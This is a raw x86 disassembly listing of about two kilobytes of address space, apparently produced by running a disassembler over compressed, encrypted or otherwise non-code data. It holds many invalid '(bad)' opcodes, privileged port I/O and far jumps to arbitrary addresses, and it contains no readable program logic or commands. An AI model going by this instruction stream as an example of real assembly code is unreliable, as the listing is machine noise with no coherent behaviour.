  41ab22:	scas   eax,DWORD PTR es:[edi]
  41ab23:	inc    eax
  41ab24:	aaa    
  41ab25:	das    
  41ab26:	int    0x1d
  41ab28:	pop    ecx
  41ab29:	rcl    DWORD PTR [edx+0x6],0xf6
  41ab2d:	jg     0x41ab15
  41ab2f:	sti    
  41ab30:	ret    0xd286
  41ab33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab34:	mov    ah,0x55
  41ab36:	and    bl,BYTE PTR [edi+0x754192c7]
  41ab3c:	cmp    al,0xfa
  41ab3e:	xlat   BYTE PTR ds:[ebx]
  41ab3f:	adc    DWORD PTR [ebx+eax*4-0x4e5f85ee],0xadeb78bb
  41ab4a:	popa   
  41ab4b:	shl    esp,cl
  41ab4d:	pop    DWORD PTR [ecx-0xa]
  41ab50:	ds mov esi,edi
  41ab53:	jns    0x41ab63
  41ab55:	test   DWORD PTR [esi-0x4c671dad],esp
  41ab5b:	push   ss
  41ab5c:	retf   0xeb15
  41ab5f:	lds    edi,FWORD PTR [ebx-0x20]
  41ab62:	xor    BYTE PTR [ebx+0x7e4e68a4],al
  41ab68:	pop    esi
  41ab69:	cdq    
  41ab6a:	xor    eax,0xb4f7abc6
  41ab6f:	sub    cl,al
  41ab71:	inc    eax
  41ab72:	adc    bh,BYTE PTR [edi+ecx*1+0x66]
  41ab76:	push   edi
  41ab77:	ss dec edi
  41ab79:	xor    DWORD PTR [ecx],edi
  41ab7b:	repz das 
  41ab7d:	loopne 0x41abe9
  41ab7f:	fnstsw WORD PTR [ebp+ebp*1-0x12]
  41ab83:	and    BYTE PTR [ebx+ecx*8],bh
  41ab86:	jmp    0x10f7c7d2
  41ab8b:	test   eax,0x71205d0d
  41ab90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab91:	xchg   cl,dh
  41ab93:	retf   
  41ab94:	jae    0x41ab7e
  41ab96:	jge    0x41abb9
  41ab98:	jb     0x41aba8
  41ab9a:	xchg   ebp,eax
  41ab9b:	push   ss
  41ab9c:	sbb    dh,BYTE PTR [eax-0x17cef8f9]
  41aba2:	ins    BYTE PTR es:[edi],dx
  41aba3:	pop    esp
  41aba4:	dec    edx
  41aba6:	mov    DWORD PTR [eax-0x67f677b5],edx
  41abac:	dec    esi
  41abad:	fs or  al,0x79
  41abb0:	sahf   
  41abb1:	dec    esp
  41abb2:	lods   al,BYTE PTR ds:[esi]
  41abb3:	push   ds
  41abb4:	repz dec edi
  41abb6:	pushf  
  41abb7:	loopne 0x41abbf
  41abb9:	pop    ecx
  41abba:	mul    DWORD PTR [ebp-0x7b]
  41abbd:	push   edi
  41abbe:	mov    ds:0xe5b8d3f3,al
  41abc3:	jg     0x41ab70
  41abc5:	push   ecx
  41abc6:	les    ebp,FWORD PTR [eax-0x293ccd0a]
  41abcc:	outs   dx,DWORD PTR gs:[esi]
  41abce:	cs xchg ebx,eax
  41abd0:	jns    0x41ac02
  41abd2:	push   cs
  41abd3:	ins    DWORD PTR es:[edi],dx
  41abd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abd5:	(bad)  
  41abd7:	pop    ecx
  41abd8:	dec    edx
  41abd9:	dec    edi
  41abda:	push   ds
  41abdb:	mov    DWORD PTR [edi+0x6618f2ea],ecx
  41abe1:	lods   al,BYTE PTR ds:[esi]
  41abe2:	add    ebx,edi
  41abe4:	and    al,0x1f
  41abe6:	mov    WORD PTR [eax+0x3c5a2342],fs
  41abec:	arpl   WORD PTR [esi+0x1dfb2c4b],bp
  41abf2:	sub    DWORD PTR [edx],0x8ed56380
  41abf8:	mov    ds:0x3b0d2034,eax
  41abfd:	and    edx,DWORD PTR [edx+edx*8]
  41ac00:	arpl   WORD PTR ds:0x3b882720,di
  41ac06:	fldcw  WORD PTR [eax-0x4e7daefa]
  41ac0c:	dec    eax
  41ac0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac0e:	clc    
  41ac0f:	leave  
  41ac10:	pop    ss
  41ac11:	cmp    BYTE PTR [ebp-0x13],0xae
  41ac15:	mov    ebp,0x53567c5
  41ac1a:	loope  0x41abc0
  41ac1c:	and    dh,BYTE PTR [esi-0xff4bd26]
  41ac22:	sbb    eax,0xb28d13d9
  41ac27:	cmc    
  41ac28:	int3   
  41ac29:	std    
  41ac2a:	xchg   esp,eax
  41ac2b:	icebp  
  41ac2c:	jge    0x41ac91
  41ac2e:	and    DWORD PTR [edi+0x17ea8a0f],ebx
  41ac34:	dec    ebx
  41ac35:	jge    0x41ac30
  41ac37:	jo     0x41abf3
  41ac39:	fnstenv [edx+0x10]
  41ac3c:	test   eax,0x5aaf0664
  41ac41:	adc    eax,0xa5942d83
  41ac46:	fiadd  DWORD PTR [esi]
  41ac48:	(bad)  
  41ac49:	rep ins BYTE PTR es:[edi],dx
  41ac4b:	or     dh,bl
  41ac4d:	push   ds
  41ac4e:	dec    ebx
  41ac4f:	pop    ebx
  41ac50:	popa   
  41ac51:	mov    ?,WORD PTR [edx+0x2c]
  41ac54:	xor    eax,0x60e58c2d
  41ac59:	(bad)  
  41ac5a:	adc    eax,0x485ad930
  41ac5f:	mul    eax
  41ac61:	sbb    bh,0xb2
  41ac64:	test   BYTE PTR cs:[edi],dh
  41ac67:	scas   eax,DWORD PTR es:[edi]
  41ac68:	mov    ebx,DWORD PTR [ecx-0x4270198f]
  41ac6e:	mov    ah,BYTE PTR [eax-0x4d]
  41ac71:	aad    0xb9
  41ac73:	xchg   BYTE PTR [ebp+0x241f67ca],ah
  41ac79:	and    dl,BYTE PTR ds:0xf75fadd9
  41ac7f:	ins    BYTE PTR es:[edi],dx
  41ac80:	ficomp DWORD PTR [edi+0x50224161]
  41ac86:	jmp    0x7a58:0xf3632116
  41ac8d:	nop
  41ac8e:	xchg   ebx,eax
  41ac8f:	aas    
  41ac90:	mov    ch,0xb
  41ac92:	cmp    BYTE PTR [edx-0x789e4e6b],0x5a
  41ac99:	mov    ds:0x7601d897,eax
  41ac9e:	push   cs
  41ac9f:	inc    ebx
  41aca0:	je     0x41ad0d
  41aca2:	fist   DWORD PTR [esi-0x11]
  41aca5:	pop    ds
  41aca6:	hlt    
  41aca7:	jle    0x41accc
  41aca9:	jno    0x41ace2
  41acab:	mov    ch,0x47
  41acad:	mov    DWORD PTR [edi-0x7e79fd4d],esi
  41acb3:	int3   
  41acb4:	inc    ebx
  41acb5:	xchg   DWORD PTR [si+0x76],ebx
  41acb9:	jmp    0x8e94:0x19f20d07
  41acc0:	jmp    0x8984941
  41acc5:	ds (bad) 
  41acc7:	mov    dl,0x84
  41acc9:	pushf  
  41acca:	mov    al,0xd6
  41accc:	in     eax,dx
  41accd:	mov    ch,0xf8
  41accf:	test   DWORD PTR [edi+0x65],ebx
  41acd2:	cli    
  41acd3:	lds    edx,FWORD PTR [eax-0x58]
  41acd6:	ds in  eax,dx
  41acd8:	or     ah,BYTE PTR [ebx-0x57a4360]
  41acde:	fidiv  WORD PTR [eax]
  41ace0:	bound  esp,QWORD PTR [ebp+0x7c55ceab]
  41ace6:	pop    eax
  41ace7:	add    edx,DWORD PTR [esi]
  41ace9:	test   eax,0xef02800b
  41acee:	aaa    
  41acef:	and    al,0x4e
  41acf1:	xchg   esp,eax
  41acf2:	mov    ebp,0x9dfe5bd6
  41acf7:	sbb    BYTE PTR [ecx-0x193ef0cc],dh
  41acfd:	repnz mov DWORD PTR [ecx],ecx
  41ad00:	gs xor eax,0xcdeee736
  41ad06:	retf   0x3f2a
  41ad09:	cmp    eax,0x27a391c0
  41ad0e:	cdq    
  41ad0f:	jmp    FWORD PTR [eax-0x5142f4b1]
  41ad15:	cmp    BYTE PTR [edi+0x23],bh
  41ad18:	(bad)  
  41ad19:	jle    0x41acbe
  41ad1b:	sub    al,0xf6
  41ad1d:	push   edx
  41ad1e:	stos   BYTE PTR es:[edi],al
  41ad1f:	pushf  
  41ad20:	and    DWORD PTR [ecx+esi*4-0x3d35775c],esp
  41ad27:	or     dl,BYTE PTR [ecx-0x5b186ada]
  41ad2d:	repz in eax,dx
  41ad2f:	cmc    
  41ad30:	jmp    0x41ad13
  41ad32:	or     eax,0x70acc021
  41ad37:	(bad)  
  41ad38:	dec    edi
  41ad39:	neg    BYTE PTR [eax-0x14]
  41ad3c:	jmp    0x41acff
  41ad3e:	repz adc ebx,DWORD PTR [ebx+0x61a01bcd]
  41ad45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad46:	fwait
  41ad47:	inc    ebp
  41ad48:	sub    ecx,esp
  41ad4a:	inc    ecx
  41ad4b:	pushf  
  41ad4c:	clc    
  41ad4d:	or     BYTE PTR [esi-0x6019d8ee],0x90
  41ad54:	fs in  eax,0x86
  41ad57:	cdq    
  41ad58:	in     al,dx
  41ad59:	xchg   edi,eax
  41ad5a:	xor    esi,DWORD PTR [esi]
  41ad5c:	adc    eax,0x3c642dde
  41ad61:	xchg   edx,eax
  41ad62:	xchg   DWORD PTR [ecx+0x27a2e78e],esi
  41ad68:	and    al,0x69
  41ad6a:	jmp    0x41ad10
  41ad6c:	mov    dh,0x5f
  41ad6e:	les    esi,FWORD PTR [edi]
  41ad70:	add    eax,0x8402c7a2
  41ad75:	outs   dx,DWORD PTR ds:[esi]
  41ad76:	daa    
  41ad77:	mov    ecx,0xbb41baf2
  41ad7c:	lock repnz loope 0x41ad57
  41ad80:	sahf   
  41ad81:	cmp    ah,bh
  41ad83:	clc    
  41ad84:	mov    ?,edi
  41ad86:	sbb    eax,0xca85fedf
  41ad8b:	xchg   edx,eax
  41ad8c:	mov    DWORD PTR [edi],ebx
  41ad8e:	js     0x41ae06
  41ad90:	inc    ecx
  41ad91:	sub    eax,0xfcc25273
  41ad96:	(bad)  
  41ad97:	lds    edx,FWORD PTR [edx+ebp*4]
  41ad9a:	in     al,dx
  41ad9b:	adc    al,0xbf
  41ad9d:	pop    ebx
  41ad9e:	lods   eax,DWORD PTR ds:[esi]
  41ad9f:	add    DWORD PTR [esi-0x50],esp
  41ada2:	mov    al,ds:0xac717d1f
  41ada7:	pop    ebx
  41ada8:	in     eax,0x48
  41adaa:	push   ecx
  41adab:	out    0xde,al
  41adad:	jmp    DWORD PTR [ecx-0x3c]
  41adb0:	pushf  
  41adb1:	sbb    al,0xdd
  41adb3:	stc    
  41adb4:	adc    eax,0xe9f1b04a
  41adb9:	sbb    BYTE PTR [eax-0xf],cl
  41adbc:	test   DWORD PTR [edx+0x5f845193],eax
  41adc2:	(bad)  [ebp+esi*4+0x14ae66bd]
  41adc9:	test   al,0x32
  41adcb:	les    esp,FWORD PTR [edx-0x3d0b9ece]
  41add1:	lock sbb DWORD PTR [edi+esi*2-0xbf50069],esi
  41add9:	jp     0x41adc0
  41addb:	cs push ss
  41addd:	call   0x850a2035
  41ade2:	repnz retf 0x6ce6
  41ade6:	xlat   BYTE PTR ds:[ebx]
  41ade7:	add    al,0xc7
  41ade9:	daa    
  41adea:	pop    ebx
  41adeb:	dec    ecx
  41adec:	(bad)  
  41aded:	mov    dh,0xc3
  41adef:	mov    eax,ds:0x5496df6d
  41adf4:	xchg   esi,eax
  41adf5:	iret   
  41adf6:	push   edi
  41adf7:	dec    esi
  41adf8:	mov    ds:0xee5127f7,al
  41adfd:	loope  0x41adff
  41adff:	iret   
  41ae00:	shl    BYTE PTR [esp+ebp*2],0xa1
  41ae04:	js     0x41ae83
  41ae06:	sbb    DWORD PTR [ebp-0xb],0xffffffe7
  41ae0a:	add    eax,0x7bd09674
  41ae0f:	mov    ecx,0xbab005a5
  41ae14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae15:	loopne 0x41ae7d
  41ae17:	inc    edx
  41ae18:	test   bl,bh
  41ae1a:	xchg   esp,eax
  41ae1b:	push   0xffffff84
  41ae1d:	and    esi,DWORD PTR [esi+0x73]
  41ae20:	push   ss
  41ae21:	addr16 mov cl,0x15
  41ae24:	mov    ecx,0xdecc6a90
  41ae29:	mov    dh,0x43
  41ae2b:	retf   0x5b10
  41ae2e:	and    eax,0x9fcbc386
  41ae33:	rcr    DWORD PTR [esi],0x6
  41ae36:	jecxz  0x41ae57
  41ae38:	cwde   
  41ae39:	push   edi
  41ae3a:	mov    ds:0xb2a3ac97,al
  41ae3f:	shl    esp,1
  41ae41:	push   0x18632f2e
  41ae46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae47:	into   
  41ae48:	sbb    BYTE PTR [ebp-0x6aa6e71e],bl
  41ae4e:	ins    DWORD PTR es:[edi],dx
  41ae4f:	shl    al,cl
  41ae51:	scas   eax,DWORD PTR es:[edi]
  41ae52:	dec    ebp
  41ae53:	lock xchg edx,eax
  41ae55:	sbb    DWORD PTR [ebx-0x69],ebp
  41ae58:	mov    cl,0x64
  41ae5a:	ins    DWORD PTR es:[edi],dx
  41ae5b:	mov    ecx,DWORD PTR [ebp-0x80]
  41ae5e:	inc    esi
  41ae5f:	or     DWORD PTR [ebp-0x9],0xffffffbc
  41ae63:	sar    ebp,cl
  41ae65:	or     BYTE PTR [edx-0x7c],cl
  41ae68:	adc    ah,ah
  41ae6a:	mov    esi,?
  41ae6c:	lods   eax,DWORD PTR ds:[esi]
  41ae6d:	mov    ds:0xaa5c66c2,eax
  41ae72:	enter  0x8b89,0x92
  41ae76:	sbb    eax,DWORD PTR [ebx-0x53]
  41ae79:	push   ss
  41ae7a:	sub    dl,BYTE PTR [eax]
  41ae7c:	leave  
  41ae7d:	ss addr16 sbb eax,0xfb41d54f
  41ae84:	std    
  41ae85:	pop    ebp
  41ae86:	add    BYTE PTR [eax-0x24894882],bh
  41ae8c:	rcl    BYTE PTR [esi-0x6d],1
  41ae8f:	sbb    bh,cl
  41ae91:	les    edi,FWORD PTR [ebp+esi*2+0x55fa14c2]
  41ae98:	mov    eax,ds:0xd34219d4
  41ae9d:	xchg   ecx,eax
  41ae9e:	ja     0x41aeff
  41aea0:	xchg   ecx,eax
  41aea1:	enter  0x3874,0xd6
  41aea5:	mov    ds:0xace9c123,eax
  41aeaa:	lahf   
  41aeab:	xchg   cl,bl
  41aead:	nop
  41aeae:	xchg   BYTE PTR [ebp+edx*4-0x3d],al
  41aeb2:	retf   0xc321
  41aeb5:	xchg   esp,eax
  41aeb6:	adc    al,0xa8
  41aeb8:	stos   BYTE PTR es:[edi],al
  41aeb9:	imul   esp,ecx,0x5c
  41aebc:	outs   dx,BYTE PTR ds:[esi]
  41aebd:	and    ebx,0x3f79283b
  41aec3:	imul   eax,DWORD PTR [ebp-0x329370be],0x48
  41aeca:	pop    esp
  41aecb:	ins    DWORD PTR es:[edi],dx
  41aecc:	ror    BYTE PTR gs:[ebp+0x39],1
  41aed0:	jbe    0x41af18
  41aed2:	lods   eax,DWORD PTR ds:[esi]
  41aed3:	jae    0x41af27
  41aed5:	das    
  41aed6:	mov    ebx,0xb8e24463
  41aedb:	gs xor eax,0x19027278
  41aee1:	adc    ch,BYTE PTR [ebx]
  41aee3:	mov    ebp,0x59b7e8e
  41aee8:	retf   
  41aee9:	arpl   WORD PTR [ebx-0x838d201],sp
  41aeef:	retf   
  41aef0:	add    eax,0x2744d534
  41aef5:	push   ebp
  41aef6:	pop    eax
  41aef7:	call   0x8124906b
  41aefc:	retf   0xd84
  41aeff:	adc    eax,0x2a217fd5
  41af04:	outs   dx,DWORD PTR ds:[esi]
  41af05:	sub    al,0xba
  41af07:	xchg   esi,eax
  41af08:	lods   eax,DWORD PTR ds:[esi]
  41af09:	in     al,0xb1
  41af0b:	out    dx,al
  41af0c:	jbe    0x41af25
  41af0e:	xlat   BYTE PTR ds:[ebx]
  41af0f:	out    dx,al
  41af10:	jg     0x41ae98
  41af12:	loop   0x41af4e
  41af14:	fbld   TBYTE PTR [ecx]
  41af16:	ret    0x4bf5
  41af19:	dec    ecx
  41af1a:	iret   
  41af1b:	fcmovu st,st(1)
  41af1d:	nop
  41af1e:	(bad)
  41af22:	xchg   edi,eax
  41af23:	mov    al,ds:0x600bd9d0
  41af28:	adc    eax,0x887cab5c
  41af2d:	ins    BYTE PTR es:[edi],dx
  41af2e:	es repnz iret 
  41af31:	jecxz  0x41af19
  41af33:	sub    DWORD PTR [esi+edi*8-0x2b288510],esi
  41af3a:	inc    ebx
  41af3b:	(bad)
  41af3f:	stos   DWORD PTR es:[edi],eax
  41af40:	inc    eax
  41af41:	je     0x41af58
  41af43:	mov    cs,WORD PTR [ecx+0x7fd8f446]
  41af49:	xor    eax,0xb1a1c90f
  41af4e:	dec    esi
  41af4f:	sbb    esp,DWORD PTR [ebx-0x69]
  41af52:	mov    dl,0xb2
  41af54:	outs   dx,DWORD PTR ds:[esi]
  41af55:	adc    bh,dl
  41af57:	imul   eax,DWORD PTR [ecx-0x7176e178],0xc
  41af5e:	daa    
  41af5f:	pop    ebp
  41af60:	mov    al,ds:0x8f194d54
  41af65:	mov    ebp,0xf337d2fc
  41af6a:	adc    al,0xca
  41af6c:	pop    eax
  41af6d:	rol    BYTE PTR [edx-0x1205d603],1
  41af73:	mov    al,0x25
  41af75:	je     0x41af2c
  41af77:	fsub   DWORD PTR [ecx]
  41af79:	xor    eax,edi
  41af7b:	push   cs
  41af7c:	aam    0x37
  41af7e:	mov    eax,0x719c5a17
  41af83:	hlt    
  41af84:	mov    esi,0x6aa377f1
  41af89:	sbb    esp,edi
  41af8b:	inc    ebx
  41af8c:	das    
  41af8d:	mov    ebx,0x739a4cdb
  41af92:	fsubp  st(1),st
  41af94:	dec    ecx
  41af95:	lea    ebx,[edi+ebx*1]
  41af98:	xchg   DWORD PTR [ebp-0x3e0869cc],edx
  41af9e:	jp     0x41af68
  41afa0:	je     0x41af9f
  41afa2:	rol    bl,cl
  41afa4:	jo     0x41af83
  41afa6:	push   esi
  41afa7:	jecxz  0x41afdd
  41afa9:	dec    edi
  41afaa:	aam    0xc2
  41afac:	lods   eax,DWORD PTR ds:[esi]
  41afad:	sub    dl,BYTE PTR [esi+0x2]
  41afb0:	sbb    ah,BYTE PTR [edx+0x78]
  41afb3:	test   eax,0xfe70d246
  41afb8:	out    dx,al
  41afb9:	push   esp
  41afba:	int    0x3a
  41afbc:	imul   ecx,DWORD PTR [edx+0x2a7e4e1a],0xeeeac39f
  41afc6:	mov    ebp,0x11f44c7
  41afcb:	(bad)  [edx+0x4f]
  41afce:	jae    0x41afa3
  41afd0:	lock jp 0x41afae
  41afd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afd4:	jl     0x41af9a
  41afd6:	div    BYTE PTR [eax-0x4c19d86d]
  41afdc:	mov    dl,0x5a
  41afde:	jl     0x41af9c
  41afe0:	mov    edi,0x401fd
  41afe5:	push   edi
  41afe6:	fld    TBYTE PTR [eax-0x22b883f6]
  41afec:	sub    BYTE PTR [edi-0x6e],dl
  41afef:	or     BYTE PTR [ebx],cl
  41aff1:	adc    al,0x8b
  41aff3:	outs   dx,BYTE PTR ds:[esi]
  41aff4:	les    eax,FWORD PTR [edi+0x7c]
  41aff7:	pop    ss
  41aff8:	mov    ecx,0x1ba2e4
  41affd:	pop    ebx
  41affe:	push   ecx
  41afff:	lods   al,BYTE PTR ds:[esi]
  41b000:	mov    BYTE PTR [edi+esi*1-0x1a328be3],cl
  41b007:	bound  esi,QWORD PTR [esi+0x24]
  41b00a:	(bad)  
  41b00b:	dec    edx
  41b00c:	pop    edi
  41b00d:	ror    BYTE PTR [ebp-0x16],1
  41b010:	inc    esi
  41b011:	std    
  41b012:	or     eax,0xc8386cc6
  41b017:	adc    al,0x50
  41b019:	gs mov bl,0xea
  41b01c:	xchg   edi,eax
  41b01d:	(bad)  
  41b01e:	jb     0x41afe8
  41b020:	pop    ebx
  41b021:	fisubr WORD PTR [ebx+0x786c8883]
  41b027:	adc    ebp,ebx
  41b029:	in     al,0xf9
  41b02b:	jnp    0x41b0a6
  41b02d:	adc    ebp,DWORD PTR [eax]
  41b02f:	inc    esp
  41b030:	jge    0x41afec
  41b032:	mov    al,0xcd
  41b034:	fsubp  st(6),st
  41b036:	mov    esi,0x8502878b
  41b03b:	stc    
  41b03c:	or     DWORD PTR [eax],0xc08439cc
  41b042:	outs   dx,BYTE PTR ds:[esi]
  41b043:	fld    QWORD PTR [ebx+0x1bbd9237]
  41b049:	push   ecx
  41b04a:	int3   
  41b04b:	jecxz  0x41b05a
  41b04d:	adc    esi,DWORD PTR ds:0x4c034346
  41b053:	xor    eax,0x211fe897
  41b058:	adc    ch,BYTE PTR [eax]
  41b05a:	arpl   WORD PTR [edx-0x1d0db49],di
  41b060:	retf   
  41b061:	mov    bl,0x25
  41b063:	or     BYTE PTR [ecx+eax*2],bl
  41b066:	(bad)  
  41b067:	xor    DWORD PTR [ebx+0x4f],ebx
  41b06a:	or     edx,esp
  41b06c:	add    bh,BYTE PTR [ecx-0x137b10f9]
  41b072:	pushw  ds
  41b074:	xor    eax,0x7933fe23
  41b079:	mov    ah,0xaa
  41b07b:	jge    0x41b0d1
  41b07d:	jae    0x41b0f6
  41b07f:	xchg   ecx,eax
  41b080:	push   esp
  41b081:	or     ah,dh
  41b083:	call   0xa7de:0x4d804e46
  41b08a:	sar    DWORD PTR [edx-0x77d24b96],0x3f
  41b091:	sbb    BYTE PTR [esi-0x40421825],0x21
  41b098:	call   0xba10d489
  41b09d:	inc    edx
  41b09e:	or     al,0xf9
  41b0a0:	push   ebx
  41b0a1:	inc    esi
  41b0a2:	or     eax,0x12430199
  41b0a7:	dec    ebx
  41b0a8:	add    eax,ebp
  41b0aa:	loop   0x41b0d3
  41b0ac:	or     eax,0x2c27a86
  41b0b1:	je     0x41b0a4
  41b0b3:	inc    eax
  41b0b4:	retf   
  41b0b5:	xor    eax,0xec6346c2
  41b0ba:	or     BYTE PTR [edx+0x30],al
  41b0bd:	jecxz  0x41b07a
  41b0bf:	mov    dh,0x7a
  41b0c1:	fidivr WORD PTR [eax]
  41b0c3:	mov    al,0xc9
  41b0c5:	inc    esp
  41b0c6:	inc    esp
  41b0c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0c8:	sub    al,0x81
  41b0ca:	xor    BYTE PTR [ecx],0x7
  41b0cd:	add    dl,BYTE PTR [edx-0x38]
  41b0d0:	xor    ch,0xc0
  41b0d3:	push   ds
  41b0d4:	mov    WORD PTR [esi+0x6dba36ec],es
  41b0da:	adc    ebp,esp
  41b0dc:	pop    edi
  41b0dd:	icebp  
  41b0de:	or     eax,0xaa975031
  41b0e3:	cs cmp al,0x88
  41b0e6:	xor    DWORD PTR [edi-0x4015df0d],ebx
  41b0ec:	adc    DWORD PTR [ebx+0x83af631],esp
  41b0f2:	sub    al,0x9d
  41b0f4:	(bad)  
  41b0f5:	fiadd  DWORD PTR [ebx]
  41b0f7:	jnp    0x41b0e5
  41b0f9:	pop    eax
  41b0fa:	(bad)  
  41b0fb:	mov    cl,0x25
  41b0fd:	jp     0x41b094
  41b0ff:	lds    edi,FWORD PTR [ecx]
  41b101:	sub    eax,0x37e59d07
  41b106:	out    dx,eax
  41b107:	mov    esp,DWORD PTR [edi+0x53]
  41b10a:	ret    0xd8e7
  41b10d:	xor    BYTE PTR [eax],bh
  41b10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b110:	jmp    0x27b8:0x73c6e29b
  41b117:	idiv   BYTE PTR [edi]
  41b119:	xchg   ecx,eax
  41b11a:	fdivr  DWORD PTR [esi+0x77]
  41b11d:	mov    dh,0x1
  41b11f:	xchg   BYTE PTR [ebx+0x65],dh
  41b122:	and    ah,bh
  41b124:	loope  0x41b12a
  41b126:	gs int 0xba
  41b129:	in     eax,dx
  41b12a:	ins    DWORD PTR es:[edi],dx
  41b12b:	xor    DWORD PTR ds:0x28a9c354,ebp
  41b131:	leave  
  41b132:	cmp    bl,BYTE PTR [esi+0x297fe273]
  41b138:	cmp    edx,ebp
  41b13a:	xchg   edi,eax
  41b13b:	xchg   esi,eax
  41b13c:	mov    cl,0xca
  41b13e:	dec    edx
  41b13f:	xchg   ecx,eax
  41b140:	int3   
  41b141:	inc    eax
  41b142:	and    al,0xa
  41b144:	pop    ds
  41b145:	repz push 0xffffffd2
  41b148:	jp     0x41b159
  41b14a:	add    BYTE PTR ds:0xb6e2e830,0x9e
  41b151:	sub    BYTE PTR [esi+0x4fa658cd],ch
  41b157:	mov    dh,0xd5
  41b159:	sti    
  41b15a:	jo     0x41b11e
  41b15c:	je     0x41b17d
  41b15e:	jg     0x41b15b
  41b160:	push   edi
  41b161:	mov    cl,0x73
  41b163:	lock pushf 
  41b165:	push   esi
  41b166:	sbb    ah,dl
  41b168:	push   ebx
  41b169:	(bad)  
  41b16b:	jmp    0x41b19c
  41b16d:	inc    ebx
  41b16e:	sbb    BYTE PTR [ecx+ecx*8],0x23
  41b172:	mov    dh,0xb5
  41b174:	push   esi
  41b175:	arpl   WORD PTR [ecx+0x15e73343],dx
  41b17b:	xchg   esp,eax
  41b17c:	and    ch,0x1
  41b17f:	or     eax,0x2e654e9
  41b184:	or     eax,0x3c9aaf74
  41b189:	test   eax,0x70aa7818
  41b18e:	cwde   
  41b18f:	sar    BYTE PTR [ebp-0x2a7601f1],1
  41b195:	lods   eax,DWORD PTR ds:[esi]
  41b196:	inc    edi
  41b197:	out    0x9f,al
  41b199:	scas   eax,DWORD PTR es:[edi]
  41b19a:	dec    esp
  41b19b:	fdivp  st(2),st
  41b19d:	and    BYTE PTR [ebx+0x1b],0x19
  41b1a1:	call   0x6e63:0xf63b999f
  41b1a8:	(bad)  
  41b1a9:	addr16 int 0x4e
  41b1ac:	push   ds
  41b1ad:	jnp    0x41b1f0
  41b1af:	xor    BYTE PTR [ebp-0x6ac3ac41],cl
  41b1b5:	outs   dx,BYTE PTR ds:[esi]
  41b1b6:	mov    bl,0x44
  41b1b8:	sub    DWORD PTR [ebp-0xf9e5d80],0xcbe8c1e5
  41b1c2:	xlat   BYTE PTR ds:[ebx]
  41b1c3:	cs (bad) 
  41b1c5:	fld    QWORD PTR [ebx]
  41b1c7:	sbb    bl,BYTE PTR [eax-0x2e]
  41b1ca:	push   edx
  41b1cb:	mov    dl,0xc6
  41b1cd:	bound  edi,QWORD PTR [esi]
  41b1cf:	cmp    eax,0x75021c4a
  41b1d4:	sahf   
  41b1d5:	add    al,0xfd
  41b1d7:	ret    
  41b1d8:	ficomp DWORD PTR [edx+0x34240990]
  41b1de:	retf   0x821b
  41b1e1:	pop    DWORD PTR [eax-0x35]
  41b1e4:	sbb    al,0x41
  41b1e6:	lahf   
  41b1e7:	inc    ebp
  41b1e8:	mov    ah,0x4
  41b1ea:	pop    ss
  41b1eb:	enter  0x108c,0xc1
  41b1ef:	push   esp
  41b1f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1f1:	xchg   edi,eax
  41b1f2:	dec    eax
  41b1f3:	jmp    0x812cb288
  41b1f8:	leave  
  41b1f9:	aad    0x14
  41b1fb:	xor    DWORD PTR [ecx],edx
  41b1fd:	xor    BYTE PTR [edx-0x1ecabd70],bl
  41b203:	test   eax,0xbc20eefd
  41b208:	mov    ch,0x7d
  41b20a:	and    eax,0xfe0924c
  41b20f:	daa    
  41b210:	lahf   
  41b211:	adc    ah,BYTE PTR [edi+0x19e2e262]
  41b217:	shr    BYTE PTR [ecx-0x60af2914],cl
  41b21d:	out    dx,al
  41b21e:	jle    0x41b201
  41b220:	and    DWORD PTR [ebx],0x75
  41b223:	je     0x41b2a1
  41b225:	mov    bh,0xbd
  41b227:	in     eax,0x80
  41b229:	or     BYTE PTR [ecx-0x67e3143b],al
  41b22f:	sub    eax,0xa2cfab6c
  41b234:	int3   
  41b235:	jae    0x41b1db
  41b237:	add    DWORD PTR ds:0x98aa7021,ebp
  41b23d:	outs   dx,BYTE PTR ds:[esi]
  41b23e:	sbb    DWORD PTR [eax+esi*1+0x13],ecx
  41b242:	pop    eax
  41b243:	lods   al,BYTE PTR fs:[esi]
  41b245:	outs   dx,DWORD PTR ds:[esi]
  41b246:	adc    BYTE PTR ds:0x29124017,bl
  41b24c:	push   edi
  41b24d:	into   
  41b24e:	je     0x41b272
  41b250:	adc    BYTE PTR [edx-0x7d],0x9a
  41b254:	hlt    
  41b255:	dec    esp
  41b256:	xchg   edx,eax
  41b257:	fadd   QWORD PTR [ebp-0x2e]
  41b25a:	mov    ecx,0xb78a86a2
  41b25f:	fmul   DWORD PTR [ecx-0x75678f2f]
  41b265:	add    BYTE PTR [edx-0x1c68cebe],0x6c
  41b26c:	je     0x41b2b0
  41b26e:	das    
  41b26f:	xor    al,0x24
  41b271:	or     dl,BYTE PTR [edi]
  41b273:	mov    ch,0xaa
  41b275:	dec    esi
  41b276:	pop    eax
  41b277:	outs   dx,DWORD PTR ds:[esi]
  41b278:	daa    
  41b279:	pop    es
  41b27a:	mov    ?,eax
  41b27c:	and    ebx,DWORD PTR [eax+0x14448045]
  41b282:	xchg   ecx,ebp
  41b284:	add    al,0xa7
  41b286:	xor    ch,0xd8
  41b289:	mov    ?,ecx
  41b28b:	bound  esi,QWORD PTR [edx-0x4b]
  41b28e:	in     al,0x91
  41b290:	xchg   edx,eax
  41b291:	sbb    bh,BYTE PTR [ecx+0x4f90b16]
  41b297:	mov    ds,WORD PTR [edx]
  41b299:	(bad)  
  41b29a:	xor    ebp,DWORD PTR ds:0x52476cb8
  41b2a0:	and    DWORD PTR [eax],ebx
  41b2a2:	dec    ebx
  41b2a3:	loop   0x41b323
  41b2a5:	adc    BYTE PTR ds:0x9598529c,dh
  41b2ab:	jl     0x41b31f
  41b2ad:	stc    
  41b2ae:	test   BYTE PTR [esi+0x55],0x5f
  41b2b2:	rcl    ah,cl
  41b2b4:	fldcw  WORD PTR [esi-0x79]
  41b2b7:	push   cs
